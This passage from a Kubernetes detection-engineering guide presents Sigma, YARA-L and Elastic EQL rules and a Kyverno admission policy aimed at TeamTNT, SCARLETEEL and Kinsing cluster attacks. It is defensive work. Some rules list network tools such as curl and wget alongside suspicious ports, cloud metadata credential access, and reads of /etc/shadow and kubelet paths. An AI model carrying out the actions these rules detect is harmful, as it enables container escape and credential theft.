+<p><strong>Backend dependency — not a portable cross-backend Sigma rule:</strong> This is a backend-dependent Sigma-style example, not universally deployable Sigma content. Kubernetes audit log fields such as <code>requestObject.spec.containers.securityContext.privileged</code> are not part of any standard Sigma field taxonomy. The dot-notation used here maps to nested JSON paths in the raw audit event; each backend handles array unrolling differently. This example has been developed against Elastic (nested field mappings) and Splunk (<code>spath</code>). It will not produce matches on backends that do not support array unrolling for these paths without backend-specific field mapping work. Treat it as a backend-specific starting point, not as a generic Sigma detection.</p>
+<p><strong>TeamTNT scope note:</strong> TeamTNT RBAC Buster deploys its malicious DaemonSet <em>inside</em> <code>kube-system</code>. This rule excludes <code>kube-system</code> to suppress known-good security and CNI tooling, so it does <strong>not</strong> cover the canonical TeamTNT pattern. See <strong>Rule 1b</strong> (below) for <code>kube-system</code>-targeted DaemonSet detection.</p>
+</blockquote>
+<p><strong>Portability note:</strong> Requires a SIEM backend that supports dot-notation and nested array field access against raw Kubernetes audit JSON. Container-level fields use flat dot-notation; the backend performs array unrolling. Test against your backend before promoting to production.</p>
+<p><strong>Assumptions / normalization dependencies:</strong><br />
+- SIEM/backend must support dot-notation access to nested JSON audit event fields including <code>objectRef.*</code> and <code>requestObject.spec.*</code><br />
+- <strong>Array field handling:</strong> Sigma does not support <code>[*]</code> wildcard notation in field keys. Detection fields for container-level flags use flat dot-notation (e.g., <code>requestObject.spec.containers.securityContext.privileged</code>). The containers field in a pod spec is a JSON array; each backend must be configured to unroll it before this rule can match. The two primary approaches are:<br />
+  - <strong>Elastic:</strong> Index <code>requestObject</code> as a <code>nested</code> field type in the index mapping, then query using a <code>nested</code> query block so that Elastic evaluates field conditions within the same array element. A standard <code>keyword</code> or <code>object</code> mapping will flatten the array and cause incorrect cross-element matches. Reference: Elasticsearch <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/nested.html">nested field type</a> documentation.<br />
+  - <strong>Splunk:</strong> Use the <code>spath</code> command to extract the array path: <code>| spath input=requestObject path="spec.containers{}.securityContext.privileged" output=container_privileged</code> and then filter on <code>container_privileged=true</code>. The <code>{}</code>  notation in <code>spath</code> iterates the array elements and outputs a multi-value field. This Sigma rule can only be translated to a working Splunk SPL query after this <code>spath</code> extraction step is added; the Sigma Splunk backend does not generate this automatically.<br />
+  - Other SIEMs vary; confirm array-unrolling behavior in your specific backend before enabling in production.<br />
+- This rule targets raw <code>Pod</code> CREATE events in audit logs; DaemonSet/Deployment creates emit separate events with <code>objectRef.resource</code> set to <code>daemonsets</code>/<code>deployments</code> — see Rule 1b for the DaemonSet variant</p>
+<pre><code class="language-yaml">title: Privileged or Host-Namespace Pod Created (Non-System Namespaces)
+id: 7c3f9a1b-2e4d-4b8c-a5f2-1d9e7b3c6a4f
+name: k8s_privileged_pod_creation
+status: stable
+description: &gt;
+  Detects creation of a Pod with a privileged container securityContext
+  or with hostPID, hostNetwork, or hostIPC enabled, outside system namespaces.
+  Covers SCARLETEEL staging and general privileged pod deployment in application
+  namespaces. TeamTNT RBAC Buster deploys into kube-system — use Rule 1b for
+  that pattern. Scope: raw Pod CREATE events only.
+references:
+  - https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/
+  - https://www.sysdig.com/blog/cloud-breach-terraform-data-theft
+author: Detection Engineering
+date: 2025/03/01
+tags:
+  - attack.privilege_escalation
+  - attack.t1610
+  - attack.t1611
+  - attack.t1496
+logsource:
+  product: kubernetes
+  service: audit
+detection:
+  selection_pod_create:
+    verb: &quot;create&quot;
+    objectRef.resource: &quot;pods&quot;
+  filter_system_namespace:
+    objectRef.namespace:
+      - &quot;kube-system&quot;
+      - &quot;kube-public&quot;
+  # privileged is a per-container flag, not pod-level spec.securityContext
+  # Note: Sigma does not support [*] array wildcard notation in field keys.
+  # Use flat dot-notation; the target backend must perform array unrolling.
+  # In Elastic: use nested queries; in Splunk: use spath. Test before deploying.
+  selection_container_privileged:
+    requestObject.spec.containers.securityContext.privileged: true
+  selection_init_privileged:
+    requestObject.spec.initContainers.securityContext.privileged: true
+  # Each host-namespace flag is a separate selection to produce OR logic
+  selection_hostPID:
+    requestObject.spec.hostPID: true
+  selection_hostNetwork:
+    requestObject.spec.hostNetwork: true
+  selection_hostIPC:
+    requestObject.spec.hostIPC: true
+  condition: &gt;
+    selection_pod_create
+    and not filter_system_namespace
+    and (
+      selection_container_privileged
+      or selection_init_privileged
+      or selection_hostPID
+      or selection_hostNetwork
+      or selection_hostIPC
+    )
+falsepositives:
+  - Security DaemonSets (Falco, Tetragon) in kube-system — excluded by namespace filter
+  - CNI DaemonSets (Calico, Cilium) in kube-system — excluded by namespace filter
+  - Privileged pods in non-system namespaces — investigate all remaining alerts
+level: high
+fields:
+  - user.username
+  - sourceIPs
+  - objectRef.namespace
+  - requestObject.spec.containers.image
+  - requestObject.spec.containers.securityContext.privileged
+</code></pre>
+<hr />
+<h3 id="32b-detection-rule-1b-suspicious-privileged-daemonset-in-kube-system-backend-dependent-sigma-style-example">3.2b Detection Rule 1b — Suspicious Privileged DaemonSet in kube-system (Backend-Dependent Sigma-Style Example)</h3>
+<p><strong>Maps to:</strong> TeamTNT RBAC Buster DaemonSet deployment <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a><br />
+<strong>Source:</strong> Kubernetes Audit Logs</p>
+<blockquote>
+<p><strong>Why a separate rule:</strong> TeamTNT creates its mining DaemonSet inside <code>kube-system</code> with a name mimicking <code>kube-proxy</code>. Rule 1 excludes that namespace entirely. This rule covers <code>kube-system</code> DaemonSet creates while suppressing known-good platform DaemonSets by name. <strong>The allowlist below is illustrative only; rebuild it from your actual <code>kube-system</code> DaemonSet inventory before using this rule.</strong> An unrecognized legitimate DaemonSet will alert.</p>
+</blockquote>
+<p><strong>Portability note:</strong> The <code>filter_known_good</code> allowlist is environment-specific. Every newly deployed security or CNI DaemonSet in <code>kube-system</code> must be added promptly or this rule will fire on it. <strong>Never copy this sample list as a reusable baseline.</strong> Generate the authoritative allowlist from <code>kubectl get daemonsets -n kube-system</code> and revalidate after every cluster upgrade, CNI change, or security agent deployment.</p>
+<p><strong>Maintenance note:</strong> This is a high-maintenance allowlist rule. Every cluster upgrade, new security tool deployment, or CNI change is a potential source of false positives. <strong>Deploy in Audit mode only until the allowlist is validated against your specific environment.</strong> Ongoing maintenance is required; this is not a set-and-forget analytic. Rule 1b is an example of an allowlist-based detection approach for the most volatile namespace in the cluster — it is not a recommended reusable baseline across clusters and should not be ported without rebuilding the allowlist from scratch against the target environment.</p>
+<blockquote>
+<p><strong>Backend dependency — not a portable cross-backend Sigma rule:</strong> Like Rule 1, this is a backend-dependent Sigma-style example. The <code>requestObject.spec.template.spec.*</code> field paths are raw Kubernetes audit JSON paths, not standard Sigma field taxonomy. Array unrolling for container-level fields is backend-specific. This example targets Elastic and Splunk backends; other backends require field mapping validation before the rule can produce matches.</p>
+</blockquote>
+<p><strong>Assumptions / normalization dependencies:</strong><br />
+- <code>objectRef.resource: "daemonsets"</code> targets DaemonSet CREATE events; the audit log uses plural lowercase resource names<br />
+- DaemonSet container spec path is <code>requestObject.spec.template.spec.containers.securityContext.*</code> — not <code>requestObject.spec.containers.securityContext.*</code> (Pod-level path); Sigma uses flat dot-notation without <code>[*]</code> wildcards<br />
+- Host namespace flags for DaemonSets live at <code>requestObject.spec.template.spec.hostPID</code> etc.</p>
+<pre><code class="language-yaml">title: Suspicious Privileged DaemonSet Created in kube-system
+id: 9a2b1c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d
+name: k8s_privileged_daemonset_kubesystem
+status: experimental
+description: &gt;
+  Detects a DaemonSet created in kube-system with privileged containers or
+  host namespace flags that does not match known platform DaemonSet names.
+  TeamTNT RBAC Buster creates such a DaemonSet named to mimic kube-proxy [R8].
+  The filter_known_good list is illustrative only and must be rebuilt from the
+  reader's actual kube-system DaemonSet inventory. Deploy in Audit mode only
+  until the allowlist is validated. High-maintenance: any new DaemonSet in
+  kube-system must be added promptly or it will alert.
+references:
+  - https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/
+author: Detection Engineering
+date: 2025/03/01
+tags:
+  - attack.persistence
+  - attack.t1053.007
+  - attack.t1496
+logsource:
+  product: kubernetes
+  service: audit
+detection:
+  selection_daemonset_create:
+    verb: &quot;create&quot;
+    objectRef.resource: &quot;daemonsets&quot;
+    objectRef.namespace: &quot;kube-system&quot;
+  filter_known_good:
+    # ILLUSTRATIVE ONLY — rebuild from your actual kube-system DaemonSet inventory
+    # Run: kubectl get daemonsets -n kube-system to enumerate yours
+    # Do NOT include resource types deployed as Deployments (e.g. CoreDNS is a Deployment, not a DaemonSet)
+    objectRef.name:
+      - &quot;aws-node&quot;
+      - &quot;kube-proxy&quot;
+      - &quot;falco&quot;
+      - &quot;tetragon&quot;
+      - &quot;calico-node&quot;
+      - &quot;cilium&quot;
+      - &quot;aws-guardduty-agent&quot;
+      - &quot;node-exporter&quot;
+      - &quot;ebs-csi-node&quot;
+  # DaemonSet container spec lives under spec.template.spec — not spec directly
+  # Note: [*] array wildcard notation is not valid Sigma syntax.
+  # Use flat dot-notation; backend must support array unrolling (Elastic nested / Splunk spath).
+  selection_privileged:
+    requestObject.spec.template.spec.containers.securityContext.privileged: true
+  selection_hostPID:
+    requestObject.spec.template.spec.hostPID: true
+  selection_hostNetwork:
+    requestObject.spec.template.spec.hostNetwork: true
+  selection_hostIPC:
+    requestObject.spec.template.spec.hostIPC: true
+  condition: &gt;
+    selection_daemonset_create
+    and not filter_known_good
+    and (
+      selection_privileged
+      or selection_hostPID
+      or selection_hostNetwork
+      or selection_hostIPC
+    )
+falsepositives:
+  - Newly deployed security or CNI DaemonSets not yet added to filter_known_good — tune aggressively
+  - Emergency debugging DaemonSets — investigate all remaining alerts
+level: high
+fields:
+  - user.username
+  - sourceIPs
+  - objectRef.name
+  - requestObject.spec.template.spec.containers.image
+  - requestObject.spec.template.spec.containers.securityContext.privileged
+</code></pre>
+<hr />
+<h3 id="33-detection-rule-2-rbac-clusterrolebinding-backdoor-yara-l">3.3 Detection Rule 2 — RBAC ClusterRoleBinding Backdoor (YARA-L)</h3>
+<p><strong>Maps to:</strong> TeamTNT RBAC Buster persistent backdoor<br />
+<strong>Source:</strong> Kubernetes audit logs normalized to Chronicle UDM via custom parser</p>
+<p><strong>Critical dependency:</strong> The custom UDM parser described in Section 3.1 is not a minor implementation detail — it is the core engineering dependency that determines whether this rule is even possible. Until that parser exists, ingests data correctly, and populates every <code>additional.fields</code> key used below, this rule will produce zero matches. Do not treat the rule and the parser as separable.</p>
+<p><strong>Assumptions / normalization dependencies:</strong><br />
+This is a <strong>[PARSER-SPECIFIC EXAMPLE]</strong>. It requires a custom UDM parser that populates the <code>additional.fields</code> keys and assigns <code>metadata.event_type</code> constants as described in Section 3.1. Fields using <code>additional.fields["key"]</code> syntax follow Chronicle's documented repeated-field access pattern <a href="https://cloud.google.com/chronicle/docs/yara-l/repeated-fields">[R21]</a>. The rule uses only documented UDM fields and documented YARA-L 2.0 syntax <a href="https://cloud.google.com/chronicle/docs/detection/yara-l-2-0-syntax">[R22]</a>. It will not function without the described parser.</p>
+<p><strong>Portability note:</strong> This is not portable Chronicle content; it depends on a custom parser contract. Do not deploy without first implementing the parser described in Section 3.1 and validating all <code>additional.fields</code> key names in your Chronicle instance against your actual parser output.</p>
+<pre><code>// [PARSER-SPECIFIC EXAMPLE]
+// Requires custom K8s audit log UDM parser (see Section 3.1)
+// Test in your Chronicle instance before promoting to production
+
+rule K8s_RBAC_ClusterAdmin_Binding_Then_KubeSystem_Pod {
+  meta:
+    author      = &quot;Detection Engineering&quot;
+    description = &quot;ClusterRoleBinding granting cluster-admin created, followed within 5 minutes by a pod create in kube-system. Maps to TeamTNT RBAC Buster [R8].&quot;
+    severity    = &quot;CRITICAL&quot;
+    mitre_attack = &quot;T1098&quot;
+
+  events:
+    // Event 1: ClusterRoleBinding create
+    // metadata.event_type value is parser-assigned from verb=create
+    $e1.metadata.event_type = &quot;USER_RESOURCE_CREATION&quot;        // parser-assigned constant
+    $e1.metadata.product_name = &quot;kubernetes&quot;
+    $e1.principal.user.userid = $actor                        // [STANDARD UDM]
+
+    // objectRef fields extracted by parser into additional.fields
+    $e1.additional.fields[&quot;k8s_resource&quot;] = &quot;clusterrolebindings&quot;   // [PARSER-DEFINED]
+    $e1.additional.fields[&quot;roleRef_name&quot;] = &quot;cluster-admin&quot;          // [PARSER-DEFINED]
+
+    // Event 2: Pod create in kube-system within 5 minutes
+    $e2.metadata.event_type = &quot;USER_RESOURCE_CREATION&quot;        // parser-assigned constant
+    $e2.metadata.product_name = &quot;kubernetes&quot;
+    $e2.principal.user.userid = $actor                        // REQUIRED: bind $actor in e2 so match section is valid
+    $e2.additional.fields[&quot;k8s_resource&quot;]  = &quot;pods&quot;           // [PARSER-DEFINED]
+    $e2.additional.fields[&quot;k8s_namespace&quot;] = &quot;kube-system&quot;    // [PARSER-DEFINED]
+
+    // Cluster identifier — parser populates from cluster ARN or API server endpoint
+    // Use a parser-defined additional.fields key rather than overloading principal.hostname
+    $e1.additional.fields[&quot;cluster_id&quot;] = $cluster_id        // [PARSER-DEFINED]
+    $e2.additional.fields[&quot;cluster_id&quot;] = $cluster_id        // [PARSER-DEFINED]
+
+    // Temporal ordering: binding before pod creation
+    $e1.metadata.event_timestamp.seconds &lt; $e2.metadata.event_timestamp.seconds
+
+  match:
+    $actor, $cluster_id over 5m
+
+  condition:
+    $e1 and $e2
+
+  outcome:
+    $risk_score = max(95)
+    $description = strings.concat(
+      &quot;cluster-admin binding by [&quot;, $actor,
+      &quot;] followed by pod create in kube-system&quot;
+    )
+}
+</code></pre>
+<hr />
+<h3 id="34-detection-rule-3-exec-then-outbound-imds-access-elastic-eql">3.4 Detection Rule 3 — exec-then-Outbound / IMDS Access (Elastic EQL)</h3>
+<p><strong>Maps to:</strong> SCARLETEEL credential exfiltration (3a), SCARLETEEL IMDS theft (3b), Kinsing mining pool connection (3a)<br />
+<strong>Source:</strong> Elastic ECS-normalized events from Falco/Tetragon + network agent</p>
+<p><strong>Assumptions / normalization dependencies:</strong><br />
+- Events use Elastic Common Schema (ECS) field names: <code>process.name</code>, <code>process.working_directory</code>, <code>destination.ip</code>, <code>container.id</code><br />
+- <code>container.id</code> must be populated consistently across process and network events by the ingestion agent; <code>container.name</code> is intentionally avoided because it is not unique across namespaces and nodes<br />
+- Rules 3a and 3b are separate to avoid a logic contradiction: Rule 3a excludes IMDS traffic; Rule 3b is the dedicated IMDS alert. Do not merge them.</p>
+<p><strong>Rule 3a — exec-then-outbound (excludes IMDS — covered by Rule 3b):</strong></p>
+<pre><code>// Elastic EQL
+// Fires when a suspicious process spawns in a container and the same
+// container connects to a non-RFC1918, non-IMDS address within 60 seconds
+
+sequence by container.id with maxspan=60s
+  [process where event.type == &quot;start&quot;
+   and container.id != null
+   and process.name in (&quot;curl&quot;, &quot;wget&quot;, &quot;python3&quot;, &quot;python&quot;, &quot;perl&quot;,
+                        &quot;ruby&quot;, &quot;bash&quot;, &quot;sh&quot;)
+   and not process.parent.name in (&quot;init&quot;, &quot;tini&quot;, &quot;dumb-init&quot;, &quot;s6-svscan&quot;)
+   and not process.working_directory in (&quot;/app&quot;, &quot;/srv&quot;, &quot;/opt/app&quot;)]
+
+  [network where event.type == &quot;connection_attempted&quot;
+   and container.id != null
+   and not cidr_match(destination.ip,
+     &quot;10.0.0.0/8&quot;,
+     &quot;172.16.0.0/12&quot;,
+     &quot;192.168.0.0/16&quot;,
+     &quot;169.254.0.0/16&quot;     // IMDS range excluded here; use Rule 3b for IMDS alerts
+   )
+   and destination.port in (80, 443, 4444, 4445, 6666, 8888, 9999, 14444)]
+</code></pre>
+<p><strong>Rule 3b — IMDS access from application pods (environment-tuned analytic pattern — not a generic production baseline):</strong></p>
+<pre><code>// Elastic EQL
+// Fires when any non-system pod connects to the cloud IMDS endpoint
+// This is the SCARLETEEL Phase 3 cloud-credential theft signal
+// Environment-tuned: namespace suppression must be validated against your cluster's
+// actual workload layout before this rule is promoted to production.
+
+network where event.type == &quot;connection_attempted&quot;
+and container.id != null
+and destination.ip == &quot;169.254.169.254&quot;
+and kubernetes.namespace != null
+and kubernetes.namespace not in (&quot;kube-system&quot;, &quot;kube-public&quot;)
+</code></pre>
+<blockquote>
+<p><strong>Suppression logic note:</strong> The filter above uses <code>kubernetes.namespace</code> — a field populated by the Elastic Kubernetes integration from the pod's namespace metadata. Namespace-based suppression is harder to spoof than container labels: a label (<code>app.kubernetes.io/name</code>) is user-controlled and can be set to any value by an attacker with <code>pods/create</code> permission. Namespace identity requires that the pod actually be scheduled in <code>kube-system</code> or <code>kube-public</code>, which admission control (Section 4.1) can enforce independently. <strong>Namespace suppression is still a simplification and not a universal production discriminator.</strong> Legitimate IMDS callers may exist outside <code>kube-system</code> and <code>kube-public</code> depending on cluster design — for example, a custom CNI DaemonSet deployed in a dedicated infrastructure namespace, a monitoring agent in <code>monitoring</code>, or a node management component in <code>kube-node-lease</code>. This rule must be tuned against the real workload identity and namespace layout of each target cluster before it is relied upon. Treat it as an environment-tuned pattern, not generic production content.</p>
+<p><strong>Legitimate IMDS callers in <code>kube-system</code>:</strong> The <code>aws-node</code> (VPC CNI) and <code>kube-proxy</code> DaemonSets run in <code>kube-system</code> and legitimately call IMDS for node role credentials. This rule suppresses the entire namespace, covering those and any other platform-level agents. If your environment has no admission control blocking privileged pods in application namespaces, a compromised application pod can be re-scheduled into <code>kube-system</code> by an attacker with sufficient RBAC — namespace suppression is a complement to, not a replacement for, admission control.</p>
+<p><strong>Label-based alternative (simplified, not production-grade):</strong> Filtering on <code>container.labels["app.kubernetes.io/name"]</code> narrows suppression to named pods but is trivially bypassed by any workload that self-assigns those labels. Use namespace-based suppression for production; reserve the label variant for lab demonstrations where the spoofing risk is acceptable.</p>
+<p><strong>Why two separate rules:</strong> A sequence correlation (Rule 3a) is the right model for detecting dropper staging (exec then connect). A single-event alert (Rule 3b) is the right model for detecting IMDS access. Merging them forces a choice between excluding IMDS (creating a blind spot for SCARLETEEL Phase 3) or including it (flooding Rule 3a with false positives from routine IMDS health checks). Keep them separate.</p>
+</blockquote>
+<hr />
+<h3 id="35-detection-rule-4-privileged-pod-then-host-file-access-sigma-correlation">3.5 Detection Rule 4 — Privileged Pod then Host File Access (Sigma Correlation)</h3>
+<p><strong>Maps to:</strong> CVE-2024-21626 exploitation, runc escape attempts (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881)<br />
+<strong>Source:</strong> K8s audit log (control plane) + eBPF/auditd host file access event (data plane)</p>
+<p><strong>Portability note:</strong> This is a conceptual correlation pattern, not a drop-in deployable rule. It requires consistent <code>pod_name</code> enrichment across two fundamentally different telemetry planes (Kubernetes API audit and kernel eBPF/auditd). Many environments will need a dedicated cgroup-to-pod enrichment pipeline before this correlation produces reliable matches.</p>
+<p><strong>Assumptions / normalization dependencies:</strong><br />
+- Requires two child Sigma rules: <code>k8s_privileged_pod_creation</code> (Rule 1 above) and a companion eBPF/auditd rule detecting sensitive host file reads from within a container context<br />
+- <strong>Both child rules must emit a field named <code>pod_name</code></strong> for the <code>group-by</code> join to function; this requires parser-level enrichment that correlates the pod name from the audit event with the container/cgroup identity in the eBPF event<br />
+- <strong>Cgroup-to-pod enrichment is a common failure point:</strong> eBPF events identify containers by Linux cgroup ID, not Kubernetes pod name. A custom enrichment step — typically querying the container runtime socket or Kubernetes API — must map cgroup IDs to pod names before the <code>group-by</code> join can work. In practice, this enrichment fails silently: when it is missing or delayed, the correlation produces no matches for real attacks rather than false positives, making the gap invisible in routine testing. Validate the enrichment pipeline independently before relying on this rule for production coverage<br />
+- Sigma <code>temporal</code> type correlation fires when all referenced rules match events sharing the same <code>group-by</code> field value within the timespan; no <code>condition</code> threshold block is needed for <code>temporal</code> (it is required for count-based types such as <code>event_count</code>). Per the current Sigma Correlation Rules Specification, the <code>type</code>, <code>rules</code>, <code>group-by</code>, and <code>timespan</code> fields are nested under a top-level <code>correlation:</code> key — not at the document root.</p>
+<pre><code class="language-yaml"># Sigma Correlation Rule
+# Per current Sigma Correlation Rules Specification (sigmahq.io)
+# type, rules, group-by, and timespan are nested under a top-level 'correlation:' key.
+title: Privileged Pod Creation Followed by Host Sensitive File Access
+name: k8s_privileged_pod_then_host_file_access
+status: experimental
+description: &gt;
+  Correlates a privileged pod creation (API plane) with sensitive host
+  file access from inside a container (data plane), indicating a container
+  escape attempt. Both child rules must emit a pod_name field for the
+  temporal join. See normalization notes above.
+tags:
+  - attack.t1611
+  - attack.privilege_escalation
+correlation:
+  type: temporal
+  rules:
+    - k8s_privileged_pod_creation        # Rule 1 name field
+    - linux_container_host_file_access   # companion eBPF/auditd rule (see child rule below)
+  group-by:
+    - pod_name      # bare field name — must be populated in BOTH child rules by parser enrichment
+  timespan: 2m
+</code></pre>
+<p><strong>Companion child rule outline [PSEUDOCODE — adapt schema to your eBPF/auditd event fields]:</strong></p>
+<pre><code class="language-yaml">title: Sensitive Host File Access from Container Context
+name: linux_container_host_file_access
+logsource:
+  product: linux
+  service: tetragon    # or falco, auditd — adapt field names to your source
+detection:
+  selection:
+    event.type: &quot;file_open&quot;
+    file.path|startswith:
+      - &quot;/etc/shadow&quot;
+      - &quot;/etc/passwd&quot;
+      - &quot;/var/lib/kubelet&quot;
+      - &quot;/proc/1/ns&quot;
+    container.id|exists: true    # event occurred inside a container context
+    pod_name|exists: true        # parser must populate this for group-by join
+  condition: selection
+level: high
+</code></pre>
+<hr />
+<h2 id="pillar-4-defensive-architecture-hardening">Pillar 4: Defensive Architecture &amp; Hardening</h2>
+<h3 id="41-admission-controllers-enforce-before-scheduling">4.1 Admission Controllers: Enforce Before Scheduling</h3>
+<p>Admission controllers evaluate workload specifications at API submission time, before any pod is scheduled. In <code>Enforce</code> mode they prevent entire classes of attack technique from succeeding. In <code>Audit</code> mode they only generate log records while attacks succeed — Audit mode is observability, not a security control.</p>
+<blockquote>
+<p><strong>Prevention vs. detection boundary for TeamTNT in <code>kube-system</code>:</strong> The sample Kyverno policy below uses broad namespace carve-outs for <code>kube-system</code> and <code>kube-public</code> to prevent cluster degradation. This means the policy does <strong>not</strong> prevent the canonical TeamTNT-in-<code>kube-system</code> case — a malicious DaemonSet deployed there is not blocked by this sample control. For that specific pattern, admission control is not the stopping control; <strong>Rule 1b is the primary signal.</strong> The sample hardening posture for TeamTNT in <code>kube-system</code> is detection-first, not prevention-first. Readers should understand this constraint explicitly rather than inferring that the policy covers all TeamTNT techniques.</p>
+</blockquote>
+<p><strong>Control-to-technique mapping:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Attack technique</th>
+<th>Admission controller block</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TeamTNT DaemonSet with <code>hostPID: true</code> in <code>kube-system</code></td>
+<td>Admission control alone does not cleanly stop this pattern: the sample Kyverno policy broadly excludes <code>kube-system</code> for operational safety. Use <strong>Rule 1b</strong> (audit log detection) as the primary signal for malicious DaemonSets in <code>kube-system</code>.</td>
+</tr>
+<tr>
+<td>SCARLETEEL privileged container</td>
+<td>Deny <code>securityContext.privileged: true</code> cluster-wide</td>
+</tr>
+<tr>
+<td>Host filesystem traversal via <code>hostPath</code></td>
+<td>Deny all <code>hostPath</code> volumes</td>
+</tr>
+<tr>
+<td>RBAC Buster cluster-admin binding</td>
+<td>Deny ClusterRoleBinding to <code>cluster-admin</code> for non-approved subjects</td>
+</tr>
+<tr>
+<td>Unvetted container image</td>
+<td>Require images from approved registry with digest pin</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>CVE-2024-21626 clarification:</strong> Denying <code>hostPath</code> volumes does <strong>not</strong> mitigate CVE-2024-21626. That vulnerability exploits an internal runc file descriptor leak and does not require a <code>hostPath</code> volume mount. Denying <code>hostPath</code> mitigates attacks that use explicit host filesystem mounts to access node-level credentials, binaries, or container runtime sockets.</p>
+</blockquote>
+<hr />
+<h4 id="kyverno-clusterpolicy-privileged-host-namespace-hostpath-registry">Kyverno ClusterPolicy — Privileged, Host Namespace, hostPath, Registry</h4>
+<blockquote>
+<p><strong>Policy note:</strong> The example below is an environment-sensitive starting point, not a drop-in production policy. System namespace handling uses <strong>broad namespace carve-outs</strong> (<code>kube-system</code>, <code>kube-public</code>) for operational safety — not a fine-grained allowlist. This is a deliberately conservative posture: it trades tighter enforcement in system namespaces for cluster survivability. A mature implementation would replace namespace-level exclusions with inventory-driven exceptions scoped to specific service accounts, controller names, or labels — but that requires a known-good workload inventory that this document cannot provide for your environment. Test in Audit mode against your specific cluster before switching to Enforce. Do not treat this example as equivalent to the YARA-L and Sigma-correlation rules — those are explicitly labeled parser-specific; this Kyverno policy is equally environment-specific.</p>
+</blockquote>
+<p><em>What this blocks:</em> Pods, DaemonSets, Deployments, and StatefulSets that are privileged, use host namespaces, mount <code>hostPath</code> volumes, or reference images outside the approved registry — <strong>in non-system namespaces</strong>.<br />
+<em>What this does not block:</em> Kubelet-managed static pods; workloads already running at policy installation time; attacks that first obtain cluster-admin credentials before reaching the API server; <strong>any workload in <code>kube-system</code> or <code>kube-public</code></strong> — those namespaces are broadly excluded for operational safety, which means a malicious DaemonSet placed in <code>kube-system</code> (TeamTNT pattern) is not blocked by this policy. Use Rule 1b for that detection.<br />
+<em>Platform caveats:</em> Policy applies on API server admission. EKS Auto Mode, AKS, and GKE all run the API server; this policy is applicable on all of them. Fargate restrictions (no privileged, no hostNetwork) are enforced by the platform independently of this policy.</p>
+<blockquote>
+<p><strong>Why broad namespace carve-outs rather than a strict allowlist:</strong> Platform DaemonSets — CNI plugins (<code>aws-node</code>, <code>calico-node</code>, <code>cilium</code>), <code>kube-proxy</code>, and security agents (Falco, Tetragon) — legitimately require privileged containers, host namespaces, <code>hostPath</code> volumes, and images from upstream registries. A strict allowlist that names specific controllers by service account or label requires complete, maintained inventory of every platform component. The broad namespace exclusion below is an operational safety valve that prevents cluster degradation; it is not equivalent to "only known-good workloads are permitted in kube-system." Accept that tradeoff explicitly in your threat model.</p>
+</blockquote>
+<pre><code class="language-yaml">apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: pod-security-baseline
+  annotations:
+    policies.kyverno.io/title: Deny Privileged, Host-Namespace, hostPath, and Unapproved-Registry Workloads
+    policies.kyverno.io/severity: critical
+spec:
+  validationFailureAction: Enforce
+  background: true
+  rules:
+
+    # Privileged containers — Pod
+    # spec.containers[].securityContext.privileged is the correct path for Pods
+    - name: deny-privileged-pod
+      match:
+        any:
+        - resources:
+            kinds: [&quot;Pod&quot;]
+      exclude:
+        any:
+        - resources:
+            namespaces: [&quot;kube-system&quot;]
+            selector:
+              matchLabels:
+                security.io/managed: &quot;platform&quot;
+      validate:
+        message: &quot;Privileged containers are not permitted.&quot;
+        pattern:
+          spec:
+            =(initContainers):
+              - =(securityContext):
+                  =(privileged): false
+            containers:
+              - =(securityContext):
+                  =(privileged): false
+
+    # Privileged containers — workload controllers
+    # Container spec is at spec.template.spec, not spec, for DaemonSet/Deployment/StatefulSet
+    # CRITICAL: kube-system must be excluded. CNI plugins (aws-node, calico-node, cilium)
+    # and platform agents legitimately require privileged containers. Enforcing this rule
+    # against kube-system without exclusions will break CNI and cause cluster degradation.
+    - name: deny-privileged-controllers
+      match:
+        any:
+        - resources:
+            kinds: [&quot;DaemonSet&quot;, &quot;Deployment&quot;, &quot;StatefulSet&quot;, &quot;ReplicaSet&quot;]
+      exclude:
+        any:
+        - resources:
+            namespaces:
+              - &quot;kube-system&quot;
+              - &quot;kube-public&quot;
+      validate:
+        message: &quot;Privileged containers are not permitted in workload controllers.&quot;
+        pattern:
+          spec:
+            template:
+              spec:
+                =(initContainers):
+                  - =(securityContext):
+                      =(privileged): false
+                containers:
+                  - =(securityContext):
+                      =(privileged): false
+
+    # Host namespace access — Pod
+    - name: deny-host-namespaces-pod
+      match:
+        any:
+        - resources:
+            kinds: [&quot;Pod&quot;]
+      validate:
+        message: &quot;hostPID, hostNetwork, and hostIPC are not permitted.&quot;
+        pattern:
+          spec:
+            =(hostPID): false
+            =(hostNetwork): false
+            =(hostIPC): false
+
+    # Host namespace access — workload controllers
+    # CRITICAL: kube-system must be excluded. Platform DaemonSets (kube-proxy, aws-node,
+    # calico-node, cilium) legitimately require hostNetwork: true. Enforcing without
+    # exclusions will prevent platform DaemonSets from deploying or updating.
+    - name: deny-host-namespaces-controllers
+      match:
+        any:
+        - resources:
+            kinds: [&quot;DaemonSet&quot;, &quot;Deployment&quot;, &quot;StatefulSet&quot;]
+      exclude:
+        any:
+        - resources:
+            namespaces:
+              - &quot;kube-system&quot;
+              - &quot;kube-public&quot;
+      validate:
+        message: &quot;hostPID, hostNetwork, and hostIPC are not permitted in workload controllers.&quot;
+        pattern:
+          spec:
+            template:
+              spec:
+                =(hostPID): false
+                =(hostNetwork): false
+                =(hostIPC): false
+
+    # hostPath volumes — Pod
+    # Blocks host filesystem mount abuse; does NOT mitigate CVE-2024-21626
+    - name: deny-hostpath-pod
+      match:
+        any:
+        - resources:
+            kinds: [&quot;Pod&quot;]
+      validate:
+        cel:
+          expressions:
+            - expression: &gt;
+                !has(object.spec.volumes) ||
+                object.spec.volumes.all(v, !has(v.hostPath))
+              message: &quot;hostPath volumes are not permitted.&quot;
+
+    # hostPath volumes — workload controllers
+    # spec.template.spec.volumes is the correct path for controllers
+    # CRITICAL: kube-system must be excluded. Node-level agents (aws-node, ebs-csi-node,
+    # Falco, Tetragon) legitimately mount host paths. Enforcing without exclusions will
+    # break these agents and remove critical security and CNI tooling from all nodes.
+    - name: deny-hostpath-controllers
+      match:
+        any:
+        - resources:
